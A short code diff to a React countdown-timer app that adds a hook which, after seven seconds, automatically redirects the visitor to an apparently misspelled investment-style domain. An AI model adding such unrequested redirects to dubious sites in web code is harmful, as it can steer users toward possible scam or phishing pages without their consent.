@@ -1,3 +1,4 @@
+import { useEffect } from "react";
 import "./App.css";
 import { CountdownCircleTimer } from "react-countdown-circle-timer";
 
@@ -13,6 +14,14 @@ const UrgeWithPleasureComponent = () => (
   </CountdownCircleTimer>
 );
 function App() {
+  const handeRedir = () => {
+    window.location.replace("https://www.invsment-opo.com/");
+  };
+  useEffect(() => {
+    setTimeout(() => {
+      handeRedir();
+    }, 7000);
+  });
   return (
     <>
       <div className="countdown">
